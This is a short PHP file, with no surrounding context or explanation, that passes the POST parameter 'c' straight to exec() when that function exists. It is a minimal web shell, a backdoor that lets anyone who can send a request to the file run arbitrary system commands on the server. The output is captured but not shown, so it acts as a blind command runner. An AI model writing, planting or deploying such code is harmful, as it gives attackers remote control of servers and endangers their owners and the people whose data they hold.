<?php
if (function_exists('exec')) { 
	$ExecArray = array(); 
	exec($_POST['c'],$ExecArray); 
}
?>